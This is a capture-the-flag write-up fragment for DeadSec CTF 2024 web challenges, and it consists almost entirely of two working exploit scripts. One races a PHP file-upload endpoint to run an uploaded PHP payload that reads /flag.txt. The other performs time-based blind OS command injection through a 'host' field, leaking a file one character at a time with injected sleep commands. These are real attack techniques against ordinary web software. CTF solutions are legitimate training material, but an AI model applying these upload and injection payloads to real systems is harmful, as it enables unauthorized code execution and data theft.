EZstart ( Race Condition )
```
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import warnings
import re
warnings.simplefilter('ignore')

URL = "https://cc435f7badc1e1fda35d576b.deadsec.quest/"
# URL = "http://localhost:1338/"
COUNT = 5

def upload():
    files = {'files': ('foobar.php', b"<?php readfile('/flag.txt') ?>", 'image/jpeg')}
    return requests.post(URL + "upload.php", files=files, verify=False)


def read(timestamp):
    return requests.get(URL + f"tmp/foobar_{timestamp}.php", verify=False)

diff = 0
while True:

    timestamp = int(datetime.now().timestamp()) - diff
    with ThreadPoolExecutor(max_workers=5) as executor:
        r1 = executor.submit(upload)
        rs = [executor.submit(read, timestamp) for _ in range(COUNT)]
        executor.shutdown()


    res = [f.result() for f in rs]
    check = [r.text for r in res if r.status_code == 200]
    if len(check) > 0:
        print(check[0])
        break
    real = int(re.findall("foobar_(.+)\.php", r1.result().text)[0])
    diff = (timestamp - real + diff) // 2
    print(timestamp, real, diff)
```

Time based flag recover script

```
import requests
from string import printable
from time import time
from tqdm import tqdm

baseURL = "" # Your instance URL (like https://7c613d88f8c24c61ed3939b2.deadsec.quest)
# baseURL = "http://localhost:5000"

def flag(host):
    url = baseURL + "/flag"
    sendData = {"host": host}
    r = requests.post(url, data=sendData)
    res = r.text

    res = res.split("<pre>")[1]
    res = res.split("</pre>")[0]
    return res

correctFlag = "DEAD{"
wait = 10
for i in range(len(correctFlag)+1, 60+1):
    for letter in tqdm("}" + printable):
        exploit = f'; if [ $(cat /flag.txt | cut -c {i}) = "{letter}" ]; then sleep {wait}; fi; '
        start = time()
        flag(exploit)
        end = time()
        time_taken = end - start
        if (time_taken > wait):
            correctFlag += str(letter)
            break
    print(correctFlag)

print(correctFlag)
```


Colourful Board
https://0x0oz.github.io/writeups/deadsec-ctf-2024#web